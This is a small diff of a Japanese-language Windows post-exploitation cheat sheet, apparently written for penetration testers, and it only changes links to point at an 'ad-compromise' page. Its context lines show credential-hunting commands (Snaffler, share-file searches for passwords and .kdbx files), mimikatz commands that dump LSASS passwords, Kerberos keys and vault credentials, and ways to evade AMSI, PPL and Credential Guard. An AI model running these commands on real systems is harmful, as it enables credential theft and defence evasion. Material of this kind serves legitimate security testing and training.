@@ -436,7 +436,7 @@ netsh winhttp show proxy</code></pre></div>
 
     <section id="s06" class="reveal">
       <h2><span class="num">06</span>Domain Enumeration (from Host)<span class="jp">ホストからの AD 列挙</span></h2>
-      <p>ホスト側から見える AD 情報の入口のみ。SPN / delegation / ACL の詳細列挙と攻撃は <a href="active-directory.html">active-directory sheet</a> を参照。</p>
+      <p>ホスト側から見える AD 情報の入口のみ。SPN / delegation / ACL の詳細列挙と攻撃は <a href="ad-compromise.html">ad-compromise sheet</a> を参照。</p>
 
       <h3>ドメイン基本情報</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
@@ -568,7 +568,7 @@ Find-InterestingDomainShareFile -Include @("*pass*","*cred*","*config*",".kdbx",
 .\Snaffler.exe -d $env:USERDNSDOMAIN -o C:\Windows\Tasks\snaffler.log -v Data</code></pre></div>
 
       <h3>LSASS メモリ (要 Admin)</h3>
-      <p>Section 03 で <code>RunAsPPL=0</code> かつ <code>LsaCfgFlags=0</code> を確認済みの場合。詳細は <a href="active-directory.html">AD sheet</a> の credential dump 節を参照。</p>
+      <p>Section 03 で <code>RunAsPPL=0</code> かつ <code>LsaCfgFlags=0</code> を確認済みの場合。詳細は <a href="ad-compromise.html">ad-compromise sheet</a> の credential dump 節を参照。</p>
       <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
 <pre><code>mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
 mimikatz "privilege::debug" "sekurlsa::ekeys" "exit"
@@ -611,7 +611,7 @@ mimikatz "vault::list" "vault::cred /patch" "exit"</code></pre></div>
           <tr><td>AMSI 有効</td><td>amsiInitFailed patch → ペイロード読込 (<a href="evasion.html#s04">evasion 04</a>)</td></tr>
           <tr><td>AMSI + ScriptBlockLogging</td><td>難読化 (Invoke-Obfuscation) と .NET 移行を併用</td></tr>
           <tr><td><code>RunAsPPL=1</code></td><td>mimidrv.sys / PPLKiller (<a href="evasion.html#s07">evasion 07</a>)</td></tr>
-          <tr><td>Credential Guard (LsaCfgFlags=1)</td><td>Kerberos TGT (Rubeus) のみ狙う (<a href="active-directory.html">AD sheet</a>)</td></tr>
+          <tr><td>Credential Guard (LsaCfgFlags=1)</td><td>Kerberos TGT (Rubeus) のみ狙う (<a href="ad-compromise.html">ad-compromise sheet</a>)</td></tr>
         </tbody>
       </table>
 
